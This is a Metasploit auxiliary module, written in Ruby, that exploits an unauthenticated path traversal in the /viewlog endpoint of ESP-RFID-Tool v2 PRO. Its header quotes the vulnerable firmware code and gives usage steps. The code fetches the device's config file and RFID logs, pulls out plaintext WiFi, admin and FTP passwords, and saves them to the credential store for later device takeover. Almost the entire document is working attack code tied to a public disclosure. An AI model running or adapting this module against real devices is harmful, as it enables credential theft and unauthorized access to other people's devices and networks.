##
# ESP-RFID-Tool v2 PRO — ESPR-03
# Path Traversal — Arbitrary SPIFFS File Read (Config + Credential Dump)
#
# Researcher: Milan 't4c' Berger
# Advisory:   https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt
# Affected:   ESP-RFID-Tool v2 PRO <= v2.2.2 (all versions as of 2026-05-02)
# CVE:        Pending
#
# Description:
#   The /viewlog endpoint reads the first URL query parameter positionally via
#   server.arg(0) and passes it directly to SPIFFS.open() without any path
#   validation or whitelist check. This allows reading arbitrary files from the
#   SPIFFS filesystem — including /esprfidtool.json which contains WiFi
#   credentials, the admin password, and FTP credentials in plaintext.
#
#   Vulnerable code (esprfidtool.ino, line 1219):
#     void ViewLog(){
#       String payload;
#       payload += server.arg(0);  // positional, no name required
#       File f = SPIFFS.open(payload, "r");
#       ...
#     }
#
# Usage:
#   use auxiliary/gather/esp_rfid_path_traversal
#   set RHOSTS 192.168.1.1
#   run
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'ESP-RFID-Tool v2 PRO — Path Traversal SPIFFS File Read (ESPR-03)',
        'Description' => %q{
          Exploits a path traversal vulnerability in the /viewlog endpoint of
          ESP-RFID-Tool v2 PRO (<= v2.2.2). The handler reads the first query
          parameter positionally and passes it directly to SPIFFS.open() without
          validation. No authentication is required.

          Primary target: /esprfidtool.json — contains WiFi SSID + password,
          web admin username + password, and FTP username + password in
          plaintext JSON.

          Additional targets: /log.txt, /latestlog.json, /eventlog.json

          Captured credentials are stored in the Metasploit credential store
          and can be used with ESPR-05 (OTA firmware upload) for full device
          compromise.

          Discovered by Milan 't4c' Berger. Vendor notified 2026-04-27,
          deleted disclosure comment and blocked researcher. Full public
          disclosure 2026-04-28.
        },
        'Author'      => ['dRonin (tak47loss@mail.ru)'],
        'License'     => MSF_LICENSE,
        'References'  => [
          ['URL', 'https://github.com/Einstein2150/ESP-RFID-Tool-v2'],
          ['URL', 'https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt'],
          ['Researcher', 'Milan "t4c" Berger']
        ],
        'DisclosureDate' => '2026-04-28',
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(80),
      OptBool.new('DUMP_CONFIG',
        [true, 'Dump /esprfidtool.json (WiFi/admin/FTP credentials)', true]
      ),
      OptBool.new('DUMP_LOGS',
        [true, 'Also dump RFID log files via path traversal', true]
      ),
      OptString.new('EXTRA_FILES',
        [false, 'Comma-separated additional SPIFFS file paths to attempt', '']
      ),
    ])
  end

  # Known SPIFFS file targets
  TARGET_FILES = [
    '/esprfidtool.json',
    '/log.txt',
    '/latestlog.json',
    '/eventlog.json',
  ].freeze

  def run_host(ip)
    print_status("#{ip} — Starting path traversal against SPIFFS filesystem")

    targets = []
    targets << '/esprfidtool.json' if datastore['DUMP_CONFIG']
    targets += ['/log.txt', '/latestlog.json', '/eventlog.json'] if datastore['DUMP_LOGS']

    if datastore['EXTRA_FILES'] && !datastore['EXTRA_FILES'].empty?
      extra = datastore['EXTRA_FILES'].split(',').map(&:strip)
      targets += extra
    end

    targets.uniq.each do |target_file|
      fetch_file(ip, target_file)
    end
  end

  def fetch_file(ip, filepath)
    # The vulnerability: server.arg(0) reads the VALUE of the first query param
    # regardless of the parameter name. So ?/esprfidtool.json works because
    # the entire string "/esprfidtool.json" becomes the value of arg(0).
    #
    # We pass it as the query string directly (no key=value, just the path as key)
    print_status("#{ip} — Fetching #{filepath} via /viewlog")

    res = send_request_raw({
      'method'  => 'GET',
      'uri'     => "/viewlog?#{filepath}",
    })

    if res.nil?
      print_error("#{ip} — No response for #{filepath}")
      return
    end

    if res.code == 404 || (res.code == 200 && res.body.strip.empty?)
      print_status("#{ip} — #{filepath} not found or empty (HTTP #{res.code})")
      return
    end

    if res.code != 200
      print_warning("#{ip} — #{filepath} returned HTTP #{res.code}")
      return
    end

    content = res.body
    print_good("#{ip} — Retrieved #{filepath} (#{content.length} bytes)")

    # If it's the config file, parse and report credentials
    if filepath == '/esprfidtool.json'
      parse_config(ip, content)
    else
      print_status("#{ip} — Content preview:\n#{content[0..512]}")
    end

    # Store as loot
    loot_path = store_loot(
      'esp_rfid.spiffs_file',
      'application/json',
      ip,
      content,
      filepath.gsub('/', '_').sub(/^_/, ''),
      "ESP-RFID-Tool SPIFFS file: #{filepath}"
    )
    print_good("#{ip} — Saved to loot: #{loot_path}")
  end

  def parse_config(ip, json_str)
    begin
      config = JSON.parse(json_str)

      ssid          = config['ssid']            || ''
      wifi_pass     = config['password']         || ''
      admin_user    = config['update_username']  || 'admin'
      admin_pass    = config['update_password']  || ''
      ftp_user      = config['ftp_username']     || ''
      ftp_pass      = config['ftp_password']     || ''

      print_good("#{ip} — *** CREDENTIALS EXTRACTED ***")
      print_good("  WiFi SSID:      #{ssid}")
      print_good("  WiFi Password:  #{wifi_pass.empty? ? '(none/open)' : wifi_pass}")
      print_good("  Admin User:     #{admin_user}")
      print_good("  Admin Password: #{admin_pass}")
      print_good("  FTP User:       #{ftp_user}")
      print_good("  FTP Password:   #{ftp_pass}")

      # Report admin credentials to MSF credential store
      unless admin_pass.empty?
        report_credential_login(
          address:  ip,
          port:     datastore['RPORT'],
          protocol: 'tcp',
          service_name: 'http',
          username: admin_user,
          password: admin_pass,
          status:   Metasploit::Model::Login::Status::UNTRIED
        )
      end

      # Report FTP credentials
      unless ftp_pass.empty?
        report_credential_login(
          address:  ip,
          port:     21,
          protocol: 'tcp',
          service_name: 'ftp',
          username: ftp_user,
          password: ftp_pass,
          status:   Metasploit::Model::Login::Status::UNTRIED
        )
      end

      report_vuln(
        host:  ip,
        port:  datastore['RPORT'],
        proto: 'tcp',
        name:  'ESP-RFID-Tool v2 PRO — Path Traversal Config Read (ESPR-03)',
        info:  "Extracted admin password '#{admin_pass}' for user '#{admin_user}' via /viewlog path traversal",
        refs:  references
      )

      # Also report WiFi creds as a note
      report_note(
        host:  ip,
        port:  datastore['RPORT'],
        proto: 'tcp',
        type:  'esp_rfid.wifi_credentials',
        data:  { ssid: ssid, password: wifi_pass },
        update: :unique_data
      )

    rescue JSON::ParserError => e
      print_warning("#{ip} — Could not parse config JSON: #{e.message}")
      print_status("#{ip} — Raw content:\n#{json_str[0..512]}")
    end
  end
end
